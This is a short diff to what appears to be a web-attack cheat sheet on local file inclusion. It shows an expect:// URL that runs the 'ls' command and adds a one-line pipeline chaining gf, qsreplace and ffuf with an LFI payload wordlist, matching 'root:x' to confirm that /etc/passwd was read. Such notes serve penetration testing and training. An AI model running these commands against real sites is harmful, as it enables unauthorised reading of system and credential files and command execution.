@@ -62,6 +62,11 @@ A rare but very useful wrapper is expect://, it allows execution of system comma
 http://example.com/index.php?file=expect://ls
 
 
+automation 
+
+cat urls | gf lfi | tee lfi.txt 
+
+cat lfi.txt | qsreplace FUZZ | while read url; do ffuf -u $url -mr "root:x" -w  wordlist/lfipayload.txt; done 
 
                   
     
